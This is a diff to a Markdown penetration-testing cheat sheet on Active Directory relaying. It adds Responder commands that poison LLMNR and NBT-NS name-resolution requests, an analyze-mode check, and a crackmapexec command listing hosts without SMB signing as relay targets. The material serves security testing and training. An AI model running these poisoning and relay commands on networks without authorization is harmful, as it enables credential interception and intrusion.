@@ -7,14 +7,26 @@
   * [Resource Based Constrained Delegation Webclient Attack](#Resource-Based-Constrained-Delegation-Webclient-Attack)
 - https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
 
+## Poisoning
+- Poisoning is possible with Responder, which will try to poison Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).
+
+### Responder
 #### Check if LLMNR and NBT-NS is used
-- Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).
+- It is possible to check if LLMNR and NBT-NS is used without poisoning any request.
 - Use ```-A``` for analyze mode.
 ```
-Responder -I eth0 -A
+sudo responder -I eth0 -A
+```
+
+#### Poison Requests
+- Poison Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS) requests.
+```
+sudo responder -I eth0
 ```
 
 ### SMB relaying
+- Requirement: Only possible to hosts without SMB Signing
+
 #### Check for SMB hosts without SMB signing
 ```
 crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
